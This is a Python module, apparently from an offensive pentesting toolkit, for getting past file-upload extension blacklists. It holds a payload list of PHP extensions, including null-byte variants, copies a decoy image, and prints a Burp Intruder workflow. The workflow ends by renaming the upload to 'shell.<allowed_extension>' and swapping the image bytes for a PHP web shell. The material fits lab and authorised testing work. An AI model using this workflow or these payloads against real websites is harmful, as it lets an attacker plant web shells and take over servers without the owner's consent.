from pathlib import Path
import random
import shutil

from core.paths import get_images_dir


# Common PHP extensions worth testing
EXTENSIONS = [
    "jpeg.php",
    "jpg.php",
    "png.php",
    "php",
    "php3",
    "php4",
    "php5",
    "php7",
    "php8",
    "pht",
    "phar",
    "phpt",
    "pgif",
    "phtml",
    "phtm",
    "php%00.gif",
    "php\\x00.gif",
    "php%00.png",
    "php\\x00.png",
    "php%00.jpg",
    "php\\x00.jpg",
    "inc",
]


def run(data, cred, args):
    # ---------- ANSI ----------
    G = "\033[92m"
    C = "\033[96m"
    B = "\033[94m"
    Y = "\033[93m"
    M = "\033[95m"
    W = "\033[0m"
    BOLD = "\033[1m"

    # ---------- Prepare Image ----------
    images_dir = get_images_dir()

    image = images_dir / f"image{random.randint(1,9)}.jpg"
    destination = Path.cwd() / image.name

    shutil.copy2(image, destination)

    # ---------- HUD ----------
    print(f"\n{B}┌── {BOLD}UPLOAD: BLACKLIST FILTER BYPASS{W}{B} ───────────────────────┐{W}")
    print(f"{B}│{W}  {B}Technique:{W} Blacklisted Extension Fuzzing{' ' * 13}{B}│{W}")
    print(f"{B}│{W}  {B}Image:{W}     {C}{image.name:<37}{W}{B}│{W}")
    print(f"{B}└──────────────────────────────────────────────────────────────┘{W}")

    print(f"\n{B}[{W}{G}+{W}{B}]{W} Copied {C}{image.name}{W} to the current directory.")

    # ---------- Extension List ----------
    # ---------- Extension List ----------
    print(f"\n{B}┌── {BOLD}PHP EXTENSIONS TO FUZZ{W}{B} ───────────────────────────────┐{W}")

    print(f"{Y}")
    payloads = "\n".join(EXTENSIONS)
    print(f"{Y}{payloads}{W}")
    print(f"{W}")

    print(f"{B}└──────────────────────────────────────────────────────────────┘{W}")

    # Try to auto-copy to clipboard
    if copy_to_clipboard(payloads):
        print(f"{G}[+]{W} Extension list successfully copied to your clipboard!")
    else:
        print(f"{Y}[*]{W} Could not auto-copy. Please select and copy the list manually.")

    # ---------- Workflow ----------
    print(f"\n{B}┌── {BOLD}BURP WORKFLOW{W}{B} ─────────────────────────────────────────┐{W}")

    print(f"{B}│{W} {Y}1.{W} Upload {C}{image.name}{W}.")
    print(f"{B}│{W} {Y}2.{W} Intercept the request.")
    print(f"{B}│{W} {Y}3.{W} Send the request to {C}Intruder{W}.")
    print(f"{B}│{W} {Y}4.{W} Select only the filename extension as the payload.")
    print(f"{B}│{W} {Y}5.{W} Paste the extension list above into the payload set.")
    print(f"{B}│{W} {Y}6.{W} Disable URL encoding.")
    print(f"{B}│{W} {Y}7.{W} Sort by {C}Status{W} or {C}Length{W}.")
    print(f"{B}│{W} {Y}8.{W} Identify allowed extensions (e.g. {C}phtml{W}).")
    print(f"{B}│{W} {Y}9.{W} Change:")
    print(f"{B}│{W}")
    print(f"{B}│{W}    {Y}filename=\"{image.name}\"{W}")
    print(f"{B}│{W}")
    print(f"{B}│{W}    {W}to")
    print(f"{B}│{W}")
    print(f"{B}│{W}    {M}filename=\"shell.<allowed_extension>\"{W}")
    print(f"{B}│{W}")
    print(f"{B}│{W} {Y}10.{W} Replace the image bytes with your PHP web shell.")
    print(f"{B}│{W} {Y}11.{W} Forward the request.")
    print(f"{B}└──────────────────────────────────────────────────────────────┘{W}")

    print(f"\n{B}[{W}{Y}*{W}{B}]{W} After identifying a valid extension, reuse the same request in Repeater—there is no need to generate new files on disk.\n")


def copy_to_clipboard(text):
    try:
        import pyperclip
        pyperclip.copy(text)
        return True
    except ImportError:
        # Fits your UI color scheme to show a warning
        print("\n\033[93m[!] Missing dependency: run 'pip install pyperclip' to enable auto-copy.\033[0m")
        return False
    except Exception:
        return False
